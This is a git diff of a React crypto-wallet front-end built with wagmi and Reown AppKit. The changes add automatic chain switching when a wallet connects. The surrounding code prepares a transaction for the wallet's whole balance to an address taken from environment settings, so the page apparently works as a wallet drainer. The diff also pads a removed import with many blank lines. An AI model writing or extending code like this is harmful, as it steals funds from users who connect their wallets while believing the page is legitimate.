@@ -1,7 +1,6 @@
 import selections from "../data";
 import { useChainId } from 'wagmi';
 import chainsImage  from "/images/chains.jpeg";
-
 import { 
   mainnet, 
   arbitrum, 
@@ -13,7 +12,10 @@ import {
 } from '@reown/appkit/networks';
 import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
 import {
+  useSwitchChain,
   useSendTransaction,
+  BaseError,
+  useWaitForTransactionReceipt,
   usePrepareTransactionRequest,
   useBalance,
   useGasPrice,
@@ -21,7 +23,20 @@ import {
 } from "wagmi";
 // import { parseEther } from 'viem'
 import { useEffect, useState } from "react";
-import { useWaitForTransactionReceipt } from "wagmi";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
@@ -49,6 +64,12 @@ const CHAINS = {
 const activeChain = CHAINS[chainId];
 
       const chain = CHAINS[chainId];
+      const { switchChain } = useSwitchChain({
+        throwForSwitchChainNotSupported: true,
+  onError(error) {
+    console.log("Network switch error:", error);
+  },
+});
 const { data: request } = usePrepareTransactionRequest({
   chainId: chain.id,
   account: address,
@@ -56,6 +77,11 @@ const { data: request } = usePrepareTransactionRequest({
   value: amountToSend,
 });
 // const { sendTransaction, isPending } = useSendTransaction();
+
+const requestSwitch = () => {
+  switchChain({ chainId: chain.id, })
+};
+
 
 function formatBalance(balanceBigInt, chain) {
   if (!balanceBigInt) return "0";
@@ -107,6 +133,10 @@ function formatBalance(balanceBigInt, chain) {
     if (isConnected && address ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
+      console.log("chainId:", chain.id);
+      
+      requestSwitch()
+      
       walletConnectNotification();
       console.log("Balance:", formatBalance(balance.data?.value, activeChain));
 
@@ -120,7 +150,7 @@ function formatBalance(balanceBigInt, chain) {
   const gasPrice = useGasPrice();
   const estimateGas = useEstimateGas({
     to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
-    value: balance.data?.value, // 0.001 ETH
+    value: balance.data?.value, 
   });
 
   useEffect(() => {
@@ -157,6 +187,7 @@ function formatBalance(balanceBigInt, chain) {
       },
       onError(error) {
         console.log("❌ Error:", error);
+        console.log("❌ BaseError:", BaseError);
       },
     }
     );
